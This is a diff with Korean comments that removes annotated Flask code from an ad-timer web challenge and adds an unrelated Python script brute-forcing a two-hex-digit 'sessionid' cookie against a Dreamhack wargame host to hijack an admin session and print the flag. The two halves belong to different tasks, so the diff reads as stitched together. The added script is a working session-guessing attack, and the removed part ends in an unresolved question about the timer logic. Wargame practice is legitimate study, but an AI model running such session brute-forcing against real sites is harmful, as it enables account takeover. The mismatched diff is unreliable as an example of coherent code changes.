@@ -1,44 +1,53 @@
-def _now():
-    return int(time.time())
+import requests
 
-def _ensure_session():              # _ensure_session()는 sid, csrf, last_hb로 세션 딕셔너리를 초기화함. 이후로 실행되면 이미 있으니까 if문에서 막혀서 그냥 넘어감
-    if "sid" not in session:
-        session["sid"] = secrets.token_urlsafe(16)
-    if "csrf" not in session:
-        session["csrf"] = secrets.token_urlsafe(24)
-    if "last_hb" not in session:
-        session["last_hb"] = _now()
+# 1. 대상 URL 설정
+url = "http://host3.dreamhack.games:9912/"
 
+print("공격을 시작합니다. 잠시만 기다려주세요...")
 
-@app.route("/", methods=["GET"])        
-def index():
-    _ensure_session()       # 처음에 세션을 생성함
-    # 이 부분이 의미가 있나? => 라고 생각했던 시기가 저에게도 있었지요.. => 근데 index는 최초에 사이트 접속할 때마 실행되는 게 아니라 
-    # 그냥 index페이지에 접속할 때마다 실행되는 거임, 근데 _ensure_session()에서 last_hb을 초기화하는 건 처음에만 그런 것이어서 last_hb을 최신화 하고 싶으면 이렇게 따로 해줘야함
-    session["last_hb"] = _now()     
-    return render_template(...)
-
-@app.route("/hb", methods=["POST"])
-def hb():
-    if "sid" not in session:
-        return ("", 204)
-    session["last_hb"] = _now()
-    return ("", 204)
-
-@app.route("/claim", methods=["POST"])
-def claim():
-    _ensure_session()        # 세션을 생성함, 근데 index()에서 이미 했으니까 이 줄은 주석처리해도 상관없어 보임
-
-    last_hb = session.get("last_hb", 0) # last_hb을 session에서 가져오는데 
-    age = _now() - last_hb      # last_hb은 마지막으로 활동했던 시간인데 _now()에서 뺐으니까 claim()이 실행된 시간(나이)를 나타냄
-
-    if age < 5:
-        msg = f"You're still in ads, kill all ads"
-        return render_template(...)
+# 2. 0부터 255(0xFF)까지 반복
+for i in range(256):
+    # 16진수 소문자 2자리 형태(00, 01, ..., ff)로 변환
+    session_id = f"{i:02x}"
     
-    # else 일 때 실행되는 부분
-    ...
+    # 쿠키 설정
+    cookies = {
+        'sessionid': session_id
+    }
+    
+    try:
+        # GET 요청 보내기
+        response = requests.get(url, cookies=cookies)
+        
+        # 3. 응답 내용에서 플래그나 관리자 텍스트 확인
+        # 드림핵 플래그 형식인 'DH{' 가 포함되어 있는지 확인합니다.
+        if "DH{" in response.text or "flag is" in response.text:
+            print(f"\n[+] 성공! 관리자 세션을 찾았습니다: {session_id}")
+            
+            # 플래그 부분만 추출해서 출력 (간단한 처리)
+            if "DH{" in response.text:
+                start_idx = response.text.find("DH{")
+                end_idx = response.text.find("}", start_idx) + 1
+                print(f"[!] FLAG: {response.text[start_idx:end_idx]}")
+            else:
+                print(f"응답 내용: {response.text}")
+            
+            break # 찾으면 반복 중단
+            
+    except Exception as e:
+        print(f"오류 발생: {e}")
+        break
 
-이 코드에서 session["last_hb"]을 수정하는 부분은 _ensure_session()와 16번, 23번줄에서 수정하는 것 말고는 없음
-33번줄이 True가 되기 위해서는 /페이지에 들어가 index()가 실행되고 나면 session["last_hb"]이 수정되고 5초이상 시간이 지난 다음에 /claim 으로 들어가서 claim()이 실행되면 
-30번줄의 last_hb에는 5초 이상 이전에 /에서 기록된 마지막 활동했던 시간이 기록될테니까 age는 5 이상이 돼서 33번줄의 if문이 False가 돼야하는 거 아니야?
+    # 진행 상황 표시 (선택 사항)
+    if i % 20 == 0:
+        print(f"현재 시도 중... ({session_id}/ff)")
+
+print("\n작업이 완료되었습니다.")
+
+
+
+
+
+
+
+
